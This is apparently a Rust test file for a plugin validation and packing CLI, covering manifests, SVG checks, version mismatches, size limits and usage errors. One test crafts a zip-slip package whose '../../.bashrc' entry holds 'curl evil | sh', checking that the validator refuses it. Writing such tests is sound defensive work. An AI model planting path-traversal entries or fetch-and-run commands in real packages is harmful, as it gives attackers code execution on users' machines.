//! `forge plugin validate|pack` against fixture plugins (`tests/fixtures/*`): exit codes,
//! the human output and the JSON report.

use std::path::{Path, PathBuf};

use forge_plugins::cli::run;
use forge_plugins::package::write;
use serde_json::Value;

fn fixture(name: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures")
        .join(name)
}

/// Run `forge plugin <args>`: exit code, stdout, stderr.
fn forge_plugin(args: &[&str]) -> (i32, String, String) {
    let args: Vec<String> = args.iter().map(|a| a.to_string()).collect();
    let (mut out, mut err) = (Vec::new(), Vec::new());
    let code = run(&args, &mut out, &mut err);
    (
        code,
        String::from_utf8(out).unwrap(),
        String::from_utf8(err).unwrap(),
    )
}

fn validate_json(path: &Path, extra: &[&str]) -> (i32, Value) {
    let path = path.to_str().unwrap();
    let mut args = vec!["validate", path, "--json"];
    args.extend_from_slice(extra);
    let (code, out, err) = forge_plugin(&args);
    assert!(err.is_empty(), "{err}");
    (
        code,
        serde_json::from_str(&out).unwrap_or_else(|e| panic!("{e}: {out}")),
    )
}

fn diagnostics(report: &Value) -> Vec<(String, String, String)> {
    report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| {
            (
                d["severity"].as_str().unwrap().to_string(),
                d["code"].as_str().unwrap().to_string(),
                d["field"]
                    .as_str()
                    .or(d["file"].as_str())
                    .unwrap_or("")
                    .to_string(),
            )
        })
        .collect()
}

#[test]
fn a_valid_folder_and_its_package_pass() {
    let (code, out, _) = forge_plugin(&["validate", fixture("valid").to_str().unwrap()]);
    assert_eq!(code, 0, "{out}");
    assert!(
        out.starts_with("fixture.valid 1.2.3 (folder, 7 files"),
        "{out}"
    );
    assert!(out.contains("valid (0 errors, 0 warnings)"), "{out}");

    let (code, report) = validate_json(&fixture("valid"), &["--strict"]);
    assert_eq!(code, 0);
    assert_eq!(report["schema"], 1);
    assert_eq!(report["forgeVersion"], forge_plugins::FORGE_VERSION);
    assert_eq!(report["kind"], "folder");
    assert_eq!(report["valid"], true);
    assert_eq!(report["strict"], true);
    assert_eq!(report["errors"], 0);
    assert_eq!(report["warnings"], 0);
    assert_eq!(report["plugin"]["id"], "fixture.valid");
    assert_eq!(report["plugin"]["version"], "1.2.3");
    assert_eq!(report["package"]["sha256"].as_str().unwrap().len(), 64);
    assert_eq!(report["diagnostics"], serde_json::json!([]));

    // Pack it, then validate the written package: the same bytes.
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("valid.forgeplugin");
    let (code, out, err) = forge_plugin(&[
        "pack",
        fixture("valid").to_str().unwrap(),
        "-o",
        file.to_str().unwrap(),
    ]);
    assert_eq!(code, 0, "{out}{err}");
    assert!(out.contains("sha256 "), "{out}");
    let (code, packed) = validate_json(&file, &[]);
    assert_eq!(code, 0);
    assert_eq!(packed["kind"], "package");
    assert_eq!(
        packed["package"], report["package"],
        "packing is reproducible"
    );
    let files = forge_plugins::package::read_entries(&std::fs::read(&file).unwrap()).unwrap();
    assert!(files.contains_key("THIRD_PARTY_NOTICES.md"));
    assert!(files.contains_key("theme/icons/folder.svg"));
    assert!(!files.contains_key("package.json"), "sources stay out");
}

#[test]
fn a_bad_manifest_reports_every_field() {
    let (code, report) = validate_json(&fixture("bad-manifest"), &[]);
    assert_eq!(code, 1);
    assert_eq!(report["valid"], false);
    let found = diagnostics(&report);
    for field in [
        "id",
        "version",
        "permissions.process[0]",
        "contributes.commands[0].id",
        "activationEvents[0]",
    ] {
        assert!(
            found.contains(&("error".into(), "manifest".into(), field.into())),
            "{field}: {found:?}"
        );
    }
    let (code, out, _) = forge_plugin(&["validate", fixture("bad-manifest").to_str().unwrap()]);
    assert_eq!(code, 1);
    assert!(
        out.contains("error[manifest] forge-plugin.json id: must be a lowercase reverse-DNS id"),
        "{out}"
    );
    assert!(out.contains("invalid (5 errors, 0 warnings)"), "{out}");
}

#[test]
fn a_bad_svg_is_an_error() {
    let (code, report) = validate_json(&fixture("bad-svg"), &[]);
    assert_eq!(code, 1);
    let svg: Vec<&Value> = report["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|d| d["code"] == "svg")
        .collect();
    assert_eq!(svg.len(), 1, "{report:#}");
    assert_eq!(svg[0]["file"], "theme/icons/php.svg");
    assert_eq!(svg[0]["field"], "icons.php");
    assert_eq!(svg[0]["severity"], "error");
}

#[test]
fn an_engines_mismatch_is_an_error_unless_checked_for_that_forge() {
    let (code, report) = validate_json(&fixture("engines-mismatch"), &[]);
    assert_eq!(code, 1);
    assert_eq!(
        diagnostics(&report),
        vec![("error".into(), "manifest".into(), "engines.forge".into())]
    );
    assert!(report["diagnostics"][0]["message"]
        .as_str()
        .unwrap()
        .contains("needs Forge >=99.0.0"));
    let (code, report) =
        validate_json(&fixture("engines-mismatch"), &["--forge-version", "99.1.0"]);
    assert_eq!(code, 0, "{report:#}");
    assert_eq!(report["forgeVersion"], "99.1.0");
}

#[test]
fn a_zip_slip_package_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("evil.forgeplugin");
    let manifest = std::fs::read(fixture("valid/forge-plugin.json")).unwrap();
    let bytes = write(&[
        ("forge-plugin.json", &manifest),
        ("dist/plugin.js", b"var __forgePlugin = {};"),
        ("../../.bashrc", b"curl evil | sh"),
    ])
    .unwrap();
    std::fs::write(&file, bytes).unwrap();
    let (code, report) = validate_json(&file, &[]);
    assert_eq!(code, 1);
    assert_eq!(report["diagnostics"][0]["code"], "package");
    assert!(report["diagnostics"][0]["message"]
        .as_str()
        .unwrap()
        .contains("unsafe path in package: ../../.bashrc"));
    assert_eq!(report["package"], Value::Null);
}

#[test]
fn oversized_plugins_are_refused() {
    // A package that unpacks to more than 64 MB (zeros compress well).
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("big.forgeplugin");
    let manifest = std::fs::read(fixture("engines-mismatch/forge-plugin.json")).unwrap();
    let zeros = vec![0u8; 65 * 1024 * 1024];
    std::fs::write(
        &file,
        write(&[("forge-plugin.json", &manifest), ("dist/plugin.js", &zeros)]).unwrap(),
    )
    .unwrap();
    let (code, report) = validate_json(&file, &[]);
    assert_eq!(code, 1);
    assert!(report["diagnostics"][0]["message"]
        .as_str()
        .unwrap()
        .contains("larger than 64 MB"));

    // A folder with an oversized file is refused before anything is read (a sparse file).
    let folder = dir.path().join("big");
    std::fs::create_dir_all(folder.join("dist")).unwrap();
    std::fs::write(folder.join("forge-plugin.json"), &manifest).unwrap();
    let big = std::fs::File::create(folder.join("dist/plugin.js")).unwrap();
    big.set_len(65 * 1024 * 1024).unwrap();
    let (code, report) = validate_json(&folder, &[]);
    assert_eq!(code, 1);
    assert_eq!(report["diagnostics"][0]["code"], "package");
    assert!(report["diagnostics"][0]["message"]
        .as_str()
        .unwrap()
        .contains("dist/plugin.js is larger than 64 MB"));
    assert_eq!(report["plugin"]["id"], "fixture.future");
}

#[test]
fn warnings_fail_only_with_strict() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("extra.forgeplugin");
    let mut files: Vec<(String, Vec<u8>)> = Vec::new();
    for name in [
        "forge-plugin.json",
        "dist/plugin.js",
        "theme/icon-theme.json",
        "theme/icons/file.svg",
        "theme/icons/folder.svg",
    ] {
        files.push((
            name.into(),
            std::fs::read(fixture("valid").join(name)).unwrap(),
        ));
    }
    files.push(("notes.txt".into(), b"todo".to_vec()));
    let list: Vec<(&str, &[u8])> = files
        .iter()
        .map(|(k, v)| (k.as_str(), v.as_slice()))
        .collect();
    std::fs::write(&file, write(&list).unwrap()).unwrap();
    let (code, report) = validate_json(&file, &[]);
    assert_eq!(code, 0);
    assert_eq!(
        diagnostics(&report),
        vec![("warning".into(), "unknown-file".into(), "notes.txt".into())]
    );
    let (code, report) = validate_json(&file, &["--strict"]);
    assert_eq!(code, 1);
    assert_eq!(report["valid"], false);
}

#[test]
fn usage_errors_exit_with_2() {
    assert_eq!(forge_plugin(&[]).0, 2);
    assert_eq!(forge_plugin(&["validate"]).0, 2);
    assert_eq!(forge_plugin(&["validate", "/does/not/exist"]).0, 2);
    assert_eq!(forge_plugin(&["validate", ".", "--bogus"]).0, 2);
    let empty = tempfile::tempdir().unwrap();
    let (code, _, err) = forge_plugin(&["validate", empty.path().to_str().unwrap()]);
    assert_eq!(code, 2);
    assert!(err.contains("has no forge-plugin.json"), "{err}");
    let (code, _, _) =
        forge_plugin(&["pack", fixture("valid/forge-plugin.json").to_str().unwrap()]);
    assert_eq!(code, 2);
    let (code, out, _) = forge_plugin(&["--help"]);
    assert_eq!(code, 0);
    assert!(out.contains("forge plugin validate"));
}

#[test]
fn pack_refuses_invalid_plugins_and_writes_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join("bad.forgeplugin");
    let (code, out, _) = forge_plugin(&[
        "pack",
        fixture("bad-svg").to_str().unwrap(),
        "--out",
        file.to_str().unwrap(),
    ]);
    assert_eq!(code, 1, "{out}");
    assert!(!file.exists());
}
